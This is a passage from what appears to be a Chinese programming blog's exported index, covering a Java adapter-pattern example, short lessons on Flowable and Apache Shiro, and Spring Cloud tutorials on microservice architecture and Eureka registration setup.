</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ((ICooker)worker).cook();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Boolean <span class="title">supports</span><span class="params">(Object worker)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (worker <span class="keyword">instanceof</span> ICooker);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适配器实现类ProgrammerAdapter.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.adapters.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.adapters.IWorkerAdapter;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.IProgrammer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProgrammerAdapter</span> <span class="keyword">implements</span> <span class="title">IWorkerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">work</span><span class="params">(Object worker)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ((IProgrammer)worker).programmer();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Boolean <span class="title">supports</span><span class="params">(Object worker)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (worker <span class="keyword">instanceof</span> IProgrammer);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.adapters.IWorkerAdapter;</span><br><span class="line"><span class="keyword">import</span> com.learn.adapters.impl.CookerAdapter;</span><br><span class="line"><span class="keyword">import</span> com.learn.adapters.impl.ProgrammerAdapter;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.ICooker;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.IProgrammer;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.impl.JdProgrammer;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.impl.QjdCooker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 使用适配器</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ICooker qjdCooker = <span class="keyword">new</span> QjdCooker();</span><br><span class="line">		IProgrammer jdProgrammer = <span class="keyword">new</span> JdProgrammer();</span><br><span class="line">		Object[] works = &#123;qjdCooker, jdProgrammer&#125;;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//循环遍历每个工种对象，让每个工种对象在适配器中逐个进行匹配</span></span><br><span class="line">		<span class="keyword">for</span> (Object worker : works) &#123;</span><br><span class="line">			IWorkerAdapter adapter = getAdapter(worker);</span><br><span class="line">			System.out.println(adapter.work(worker));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@Title</span>: getAdapter </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@Description</span>: 根据worker获取相应的适配器模式</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> <span class="doctag">@param</span> worker</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回类型为:IWorkerAdapter</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> IWorkerAdapter <span class="title">getAdapter</span><span class="params">(Object worker)</span> </span>&#123;</span><br><span class="line">		List&lt;IWorkerAdapter&gt; adapters = getAllAdapters();</span><br><span class="line">		<span class="keyword">for</span> (IWorkerAdapter adapter : adapters) &#123;</span><br><span class="line">			<span class="keyword">if</span>(adapter.supports(worker)) &#123;</span><br><span class="line">				<span class="keyword">return</span> adapter;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@Title</span>: getAllAdapters </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@Description</span>: 获取所有的适配器</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回类型为:List&lt;IWorkerAdapter&gt;</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;IWorkerAdapter&gt; <span class="title">getAllAdapters</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		List&lt;IWorkerAdapter&gt; adapters = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		adapters.add(<span class="keyword">new</span> CookerAdapter());</span><br><span class="line">		adapters.add(<span class="keyword">new</span> ProgrammerAdapter());</span><br><span class="line">		<span class="keyword">return</span> adapters;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>第2课 flowable工作流概念</title>
    <url>/%E5%B7%A5%E4%BD%9C%E6%B5%81/Flowable/759ef6d2.html</url>
    <content><![CDATA[<h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><ul><li>Apache Shiro是Java的一个安全(权限)框架。</li><li>Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境。</li><li>Shiro可以完成：认证、授权、加密、会话管理、与Web集成、缓存等。</li><li>下载: <a href="http://shiro.apache.org/" target="_blank" rel="noopener">http://shiro.apache.org/</a></li></ul>]]></content>
      <categories>
        <category>工作流</category>
        <category>Flowable</category>
      </categories>
      <tags>
        <tag>Flowable</tag>
      </tags>
  </entry>
  <entry>
    <title>第1章 网站架构演变过程</title>
    <url>/Spring-Cloud/aba82773.html</url>
    <content><![CDATA[<h2 id="传统项目架构-单点应用，SSH或者SSM架构"><a href="#传统项目架构-单点应用，SSH或者SSM架构" class="headerlink" title="传统项目架构(单点应用，SSH或者SSM架构)"></a>传统项目架构(单点应用，SSH或者SSM架构)</h2><p>传统的SSH架构，分为三层架构 web控制层、业务逻辑层、数据库访问层。<br>传统架构也就是单点应用，就是大家在刚开始初学JavaEE技术的时候SSH架构或者SSM架构，业务没有进行拆分，都写同一个项目工程里面，一般是适合于个人或者是小团队开发。<br>这种架构模式，一旦有一个模块导致服务不可用，可能会影响整个项目。<br><img src="/images/springcloud/%E7%AC%AC1%E7%AB%A0/01.png" alt="SpringCloud"></p><h2 id="什么是项目集群"><a href="#什么是项目集群" class="headerlink" title="什么是项目集群"></a>什么是项目集群</h2><p>多台服务器部署相同应用构成一个集群<br>作用：通过负载均衡设备共同对外提供服务</p><h2 id="分布式项目架构"><a href="#分布式项目架构" class="headerlink" title="分布式项目架构"></a>分布式项目架构</h2><p>分布式架构基于传统架构演变过来，将传统的单体项目以项目模块进行拆分，拆分为会员项目、订单项目、支付项目、优惠券项目等，从而降低耦合度，这种项目架构模式慢慢开始适合于互联网公司规模人数开发。</p><h2 id="SOA架构"><a href="#SOA架构" class="headerlink" title="SOA架构"></a>SOA架构</h2><p>SOA架构代表面向与服务架构，俗称服务化，通俗的理解为面向与业务逻辑层开发，将共同的业务逻辑抽取出来形成一个服务，提供给其他服务接口进行调用，服务与服务之间调用使用rpc远程技术。<br>SOA架构特点:</p><ol><li>SOA架构中通常使用XML方式实现通讯，在高并发情况下XML比较冗余会带来极大的影响，所以最后微服务架构中采用JSON替代xml方式。</li><li>SOA架构的底层实现通过WebService和ESB（xml与中间件混合物），Web Service技术是SOA服务化的一种实现方式，WebService底层采用soap协议进行通讯，soap协议就是Http或者是Https通道传输XML数据实现的协议。</li></ol><h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><h3 id="微服务架构产生的原因"><a href="#微服务架构产生的原因" class="headerlink" title="微服务架构产生的原因"></a>微服务架构产生的原因</h3><p>微服务架构基于SOA架构演变过来的<br>在传统的WebService架构中有如下问题:</p><ol><li>依赖中心化服务发现机制</li><li>使用Soap通讯协议，通常使用XML格式来序列化通讯数据，xml格式非常喜欢重，比较占宽带传输。</li><li>服务化管理和治理设施不完善</li></ol><h3 id="漫谈微服务架构"><a href="#漫谈微服务架构" class="headerlink" title="漫谈微服务架构"></a>漫谈微服务架构</h3><h2 id="什么是微服务"><a href="#什么是微服务" class="headerlink" title="什么是微服务"></a>什么是微服务</h2><p>微服务架是从SOA架构演变过来，比SOA架构粒度会更加精细，让专业的人去做专业的事情（专注），目的提高效率，每个服务于服务之间互不影响，微服务架构中，每个服务必须独立部署，互不影响，微服务架构更加体现轻巧、轻量级，是适合于互联网公司敏捷开发。</p><h2 id="微服务架构特征"><a href="#微服务架构特征" class="headerlink" title="微服务架构特征"></a>微服务架构特征</h2><p>微服务架构倡导应用程序设计程多个独立、可配置、可运行和可微服务的子服务。<br>服务与服务通讯协议采用Http协议，使用restful风格API形式来进行通讯，数据交换格式轻量级json格式通讯，整个传输过程中，采用二进制，所以http协议可以跨语言平台，并且可以和其他不同的语言进行相互的通讯，所以很多开放平台都采用http协议接口。</p><h2 id="微服务架构如何拆分"><a href="#微服务架构如何拆分" class="headerlink" title="微服务架构如何拆分"></a>微服务架构如何拆分</h2><ol><li>微服务把每一个职责单一功能存放在独立的服务中</li><li>每个服务运行在单独的进程中</li><li>每个服务有自己独立数据库存储、实际上有自己独立的缓存、数据库、消息队列等资源。</li></ol><h2 id="微服务架构与SOA架构区别"><a href="#微服务架构与SOA架构区别" class="headerlink" title="微服务架构与SOA架构区别"></a>微服务架构与SOA架构区别</h2><ol><li>微服务架构基于SOA架构演变过来，继承SOA架构的优点，在微服务架构中去除SOA架构中的ESB 消息总线，采用 http+json（restful）进行传输。</li><li>微服务架构比 SOA 架构粒度会更加精细，让专业的人去做专业的事情（专注），目的提高效率，每个服务于服务之间互不影响，微服务架构中，每个服务必须独立部署，微服务架构更加轻巧，轻量级。</li><li>SOA 架构中可能数据库存储会发生共享，微服务强调独每个服务都是单独数据库，保证每个服务于服务之间互不影响。</li><li>项目体现特征微服务架构比 SOA 架构更加适合与互联网公司敏捷开发、快速迭代版本，因为粒度非常精细。</li></ol><h2 id="为什么选择SpringCloud"><a href="#为什么选择SpringCloud" class="headerlink" title="为什么选择SpringCloud"></a>为什么选择SpringCloud</h2><p>因为SpringCloud出现,对微服务技术提供了非常大的帮助，因为SpringCloud 提供了一套完整的微服务解决方案，不像其他框架只是解决了微服务中某个问题。<br>服务治理: 阿里巴巴开源的Dubbo和当当网在其基础上扩展的Dubbox、Eureka、Apache 的Consul等<br>分布式配置中心: 百度的disconf、Netfix的Archaius、360的QConf、SpringCloud、携程的阿波罗等。<br>分布式任务:xxl-job、elastic-job、springcloud的task等。<br>服务跟踪:京东的hyra、springcloud的sleuth等。</p><h2 id="SpringCloud简介"><a href="#SpringCloud简介" class="headerlink" title="SpringCloud简介"></a>SpringCloud简介</h2><p>SpringCloud是基于SpringBoot基础之上开发的微服务框架，SpringCloud是一套目前非常完整的微服务解决方案框架，其内容包含服务治理、注册中心、配置管理、断路器、智能路由、微代理、控制总线、全局锁、分布式会话等。<br>SpringCloud包含众多的子项目<br>SpringCloud config 分布式配置中心<br>SpringCloud netflix 核心组件<br>Eureka:服务治理 注册中心<br>Hystrix:服务保护框架<br>Ribbon:客户端负载均衡器<br>Feign：基于ribbon和hystrix的声明式服务调用组件<br>Zuul: 网关组件,提供智能路由、访问过滤等功能。<br><img src="/images/springcloud/%E7%AC%AC1%E7%AB%A0/02.png" alt="SpringCloud"></p><h2 id="课程截图"><a href="#课程截图" class="headerlink" title="课程截图"></a>课程截图</h2><h3 id="网站架构演变过程"><a href="#网站架构演变过程" class="headerlink" title="网站架构演变过程"></a>网站架构演变过程</h3><p><img src="/images/springcloud/%E7%AC%AC1%E7%AB%A0/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E6%BC%94%E5%8F%98%E8%BF%87%E7%A8%8B.png" alt="网站架构演变过程"></p><h3 id="SOA"><a href="#SOA" class="headerlink" title="SOA"></a>SOA</h3><p><img src="/images/springcloud/%E7%AC%AC1%E7%AB%A0/SOA.png" alt="SOA"></p><h3 id="SOA架构-1"><a href="#SOA架构-1" class="headerlink" title="SOA架构"></a>SOA架构</h3><p><img src="/images/springcloud/%E7%AC%AC1%E7%AB%A0/SOA%E6%9E%B6%E6%9E%84.png" alt="SOA架构"></p><h3 id="网站架构演变过程之分布式架构"><a href="#网站架构演变过程之分布式架构" class="headerlink" title="网站架构演变过程之分布式架构"></a>网站架构演变过程之分布式架构</h3><p><img src="/images/springcloud/%E7%AC%AC1%E7%AB%A0/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E6%BC%94%E5%8F%98%E8%BF%87%E7%A8%8B%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%9E%B6%E6%9E%84.png" alt="网站架构演变过程之分布式架构"></p><h3 id="微服务架构产生的原因-1"><a href="#微服务架构产生的原因-1" class="headerlink" title="微服务架构产生的原因"></a>微服务架构产生的原因</h3><p><img src="/images/springcloud/%E7%AC%AC1%E7%AB%A0/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0.png" alt="微服务架构产生的原因"></p><h3 id="为什么要使用SpringCloud"><a href="#为什么要使用SpringCloud" class="headerlink" title="为什么要使用SpringCloud"></a>为什么要使用SpringCloud</h3><p><img src="/images/springcloud/%E7%AC%AC1%E7%AB%A0/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8SpringCloud.png" alt="为什么要使用SpringCloud"></p><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h3><p><a href="https://springcloud.cc/spring-cloud-dalston.html" title="SpringCloud" target="_blank" rel="noopener">SpringCloud国内翻译文档: https://springcloud.cc/spring-cloud-dalston.html</a></p>]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Spring Cloud</tag>
      </tags>
  </entry>
  <entry>
    <title>第1课 flowable</title>
    <url>/%E5%B7%A5%E4%BD%9C%E6%B5%81/Flowable/a30db437.html</url>
    <content><![CDATA[<h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><ul><li>Apache Shiro是Java的一个安全(权限)框架。</li><li>Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境。</li><li>Shiro可以完成：认证、授权、加密、会话管理、与Web集成、缓存等。</li><li>下载: <a href="http://shiro.apache.org/" target="_blank" rel="noopener">http://shiro.apache.org/</a></li></ul>]]></content>
      <categories>
        <category>工作流</category>
        <category>Flowable</category>
      </categories>
      <tags>
        <tag>Flowable</tag>
      </tags>
  </entry>
  <entry>
    <title>第2章 SpringCloud服务注册与发现</title>
    <url>/Spring-Cloud/deef0f2a.html</url>
    <content><![CDATA[<h2 id="什么是服务治理"><a href="#什么是服务治理" class="headerlink" title="什么是服务治理"></a>什么是服务治理</h2><p>在传统rpc远程调用中，服务与服务依赖关系，管理比较复杂，所以需要使用服务治理，管理服务与服务之间依赖关系，可以实现服务调用、负载均衡、容错等，实现服务发现与注册。</p><h2 id="服务注册与发现"><a href="#服务注册与发现" class="headerlink" title="服务注册与发现"></a>服务注册与发现</h2><p>在服务注册与发现中，有一个注册中心，当服务器启动的时候，会把当前自己服务器的信息 比如 服务地址通讯地址等以别名方式注册到注册中心上。<br>另一方（消费者|服务提供者），以该别名的方式去注册中心上获取到实际的服务通讯地址，让后在实现rpc调用。</p><h2 id="搭建注册中心"><a href="#搭建注册中心" class="headerlink" title="搭建注册中心"></a>搭建注册中心</h2><h3 id="常用注册中心框架"><a href="#常用注册中心框架" class="headerlink" title="常用注册中心框架"></a>常用注册中心框架</h3><p>1) 服务注册与发现原理 在任何rpc远程框架中，都会有一个注册中心<br>2) 注册中心概念: 存放服务地址相关信息(接口地址)</p><p>SpringCloud中支持以下三种注册中心<br>Eurcka、Consul(go语言编写)、Zookeeper<br>Dubbo支持常用两种Redis和Zookeeper</p><p>服务提供者: 提供服务接口意思<br>服务消费者: 调用别人接口进行使用<br>一个服务既可以作为提供者，也可以作为消费者。</p><p>注:eureka 英[juˈri:kə] 美[jʊ’ri:kə]</p><h3 id="注册中心环境搭建"><a href="#注册中心环境搭建" class="headerlink" title="注册中心环境搭建"></a>注册中心环境搭建</h3><h4 id="Maven依赖信息"><a href="#Maven依赖信息" class="headerlink" title="Maven依赖信息"></a>Maven依赖信息</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 管理依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>Finchley.M7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--SpringCloud eureka-server --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注意： 这里必须要添加， 否者各种依赖有问题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>spring-milestones<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Spring Milestones<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>https://repo.spring.io/libs-milestone<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="application-yml"><a href="#application-yml" class="headerlink" title="application.yml"></a>application.yml</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">###服务端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8100</span></span><br><span class="line"><span class="comment">###eureka 基本信息配置</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="comment">###注册到eurekaip地址</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/</span></span><br><span class="line">    <span class="comment">###因为自己是为注册中心，不需要自己注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment">###因为自己是为注册中心，不需要检索服务</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="启动Eureka服务"><a href="#启动Eureka服务" class="headerlink" title="启动Eureka服务"></a>启动Eureka服务</h4><p>@EnableEurekaServer作用:开启eurekaServer</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppEureka</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SpringApplication.run(AppEureka<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/springcloud/%E7%AC%AC2%E7%AB%A0/01.png" alt="SpringCloud"></p><h3 id="注册服务提供者"><a href="#注册服务提供者" class="headerlink" title="注册服务提供者"></a>注册服务提供者</h3><p>项目案例：实现会员服务（提供者）springcloud-2.0-member调用订单服务(消费者)springcloud-2.0-order</p><h4 id="Maven依赖信息-1"><a href="#Maven依赖信息-1" class="headerlink" title="Maven依赖信息"></a>Maven依赖信息</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 管理依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>Finchley.M7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- SpringBoot整合Web组件 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- SpringBoot整合eureka客户端 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注意： 这里必须要添加， 否者各种依赖有问题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>spring-milestones<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Spring Milestones<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>https://repo.spring.io/libs-milestone<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="application-yml-1"><a href="#application-yml-1" class="headerlink" title="application.yml"></a>application.yml</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">###服务启动端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line"><span class="comment">###服务名称(服务注册到eureka名称)  </span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">application:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">app-itmayiedu-member</span></span><br><span class="line"><span class="comment">###服务注册到eureka地址</span></span><br><span class="line"><span 